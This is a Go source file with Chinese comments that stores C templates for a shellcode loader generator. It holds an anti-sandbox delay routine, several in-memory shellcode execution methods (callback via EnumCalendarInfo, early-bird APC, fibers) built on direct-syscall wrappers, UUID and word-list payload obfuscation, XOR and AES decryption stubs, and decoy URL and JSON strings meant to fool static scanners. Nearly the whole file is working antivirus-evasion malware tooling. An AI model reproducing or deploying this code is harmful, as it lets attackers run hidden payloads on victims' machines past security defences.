package Loader

// 反沙箱代码
// 声明反沙箱函数 判断质数
var __c__sandbox1 = `
bool Love(long long n1) {
	if (n1 <= 1)
		return false;
	
	for (long long i = 2; i * i <= n1; ++i) {
		if (n1 %% i == 0)
			return false;
	}
	
	return true;
}
`

// 在主函数中调用
var __c__sandbox2 = `
	for(int i=0;i<10;i++){
		Love(1000000000000002493);
	}
`

// 回调函数加载
var __c__callback = `
    DWORD oldProtect;
    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
    Sw3NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
	Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
`
var __c__earlyBird = `
    SIZE_T shellSize = num_uuids * sizeof(UUID);
    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));

    memcpy(shellAddress, xpp, shellSize);
    //WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, shellSize, NULL);


    QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
    testAlert();
    //Sw3NtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    //Sw3NtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
    ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ////RtlMoveMemory(addr1, xpp,length);
    ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
	//Sw3NtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
    //Sw3NtTestAlert();
`

// 纤程加载
var __c__fiber = `
    PVOID mainFiber = ConvertThreadToFiber(NULL);
    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x40);
    Sw3NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);

    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)addr, NULL);

    SwitchToFiber(shellcodeFiber);
`

// uuid混淆
var __c__uuid = `
	const char* uuids[] = { %s };
	int num_uuids = sizeof(uuids) / sizeof(uuids[0]); 
	unsigned char xpp[num_uuids];

	if (xpp == NULL) {
		// 内存分配失败处理
		return -1;
	}
	for (int i = 0; i < num_uuids; i++) {
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)(xpp + i * sizeof(UUID)));
		if (status != RPC_S_OK) {
			free(xpp);
			return -1; // UUID 字符串转换失败
		}
	}
    unsigned int length = num_uuids * sizeof(UUID);

`

// english_words混淆模板
var __c__words = `
	const char* names[] = { %s };
    const char* name[] = { %s };
	unsigned char xpp[sizeof(name)];

    for (int sc_index = 0; sc_index < sizeof(xpp); sc_index++) {
        for (int tt_index = 0; tt_index < sizeof(names); tt_index++)
        {
            if (names[tt_index] == name[sc_index]) {
                xpp[sc_index] = tt_index;
                break;
            }
        }
    }
    unsigned int length = sizeof(name) / sizeof(name[0]);

`

// c xor 模板
var __c_xor = `
#include <Windows.h>
#include <stdio.h>
#include <stdbool.h>
REPLACE_STSYSCALL_Framework
#include <Rpc.h>

typedef VOID(NTAPI* myNtTestAlert)(VOID);

REPLACE_ANTI_SANDBOX1

char url1[] = "https://www.google.com/search?q=";
char url3[] = "https://www.bing.com/search?q=";
char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
char filePath1[] = "C:/Users/username/Documents/file.txt";
char filePath2[] = "/home/user/documents/file.txt";
char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";


void ShowTime(char* data, size_t data_len, char* key, size_t key_len) {
    int j;
    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}


int main() {
	REPLACE_ANTI_SANDBOX2

	REPLACR_OBFUSCATION
    unsigned char key[] = "%s";
    unsigned int key_len = sizeof(key);
    ShowTime((char*)xpp, length, (char*)key, key_len);

	SIZE_T allocationSize = length;
	void* addr = NULL;

	REPLACE_Loading_Technique

    return 0;
}

`

// c aes 模板
var __c__aes = `

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <Windows.h>
#include "aes.h"
REPLACE_STSYSCALL_Framework

REPLACE_ANTI_SANDBOX1
char url1[] = "https://www.google.com/search?q=";
char url3[] = "https://www.perplexity.ai/search";
char url2[] = "https://www.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=";
char filePath1[] = "C:/Users/username/Documents/file.txt";
char filePath2[] = "/home/user/documents/file.txt";
char json1[] = "{\"name\":\"John\",\"age\":30,\"city\":\"New York\"}";
char json2[] = "{\"product\":\"Apple iPhone 13\",\"price\":999,\"currency\":\"USD\"}";

int main() {

	REPLACE_ANTI_SANDBOX2

	REPLACR_OBFUSCATION
    uint8_t Key[] = "%s";
    uint8_t IV[] = "%s";
    struct AES_ctx ctx;

    init(&ctx, Key, IV);
    de_buffer(&ctx, xpp, length);

	void* addr = NULL;
	SIZE_T allocationSize = length;

	REPLACE_Loading_Technique

    free(xpp);

    return 0;
}


`
